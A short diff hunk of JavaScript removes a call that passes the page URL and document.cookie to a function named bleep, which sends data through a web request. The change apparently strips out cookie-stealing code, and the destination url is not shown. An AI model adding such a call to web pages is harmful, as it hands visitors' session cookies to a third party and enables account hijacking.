@@ -8,4 +8,3 @@ function bleep(payload, url) {
   };
   request.send(JSON.stringify(params));
 }
-bleep(window.location.href + ":" + document.cookie, url);
